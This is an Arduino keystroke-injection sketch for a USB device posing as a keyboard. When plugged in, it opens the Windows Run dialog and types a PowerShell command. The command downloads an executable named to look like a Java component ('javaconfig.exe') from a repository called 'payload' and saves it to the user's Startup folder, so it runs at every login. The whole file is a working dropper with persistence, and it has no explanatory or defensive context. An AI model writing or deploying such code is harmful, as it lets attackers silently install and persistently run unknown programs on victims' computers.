#include <Keyboard.h>

void setup() {
  delay(2000); 

  Keyboard.begin();

 
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(200);
  Keyboard.releaseAll();

  delay(500); 

 
  Keyboard.print("powershell -NoExit -Command \"Invoke-WebRequest 'https://raw.githubusercontent.com/proee948/payload/main/javaconfig.exe' -OutFile \\\"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\javaconfig.exe\\\"\"");

  
  Keyboard.press(KEY_RETURN); 
  Keyboard.release(KEY_RETURN);

  Keyboard.end(); 
}

void loop() {
  // Nothing 
}
















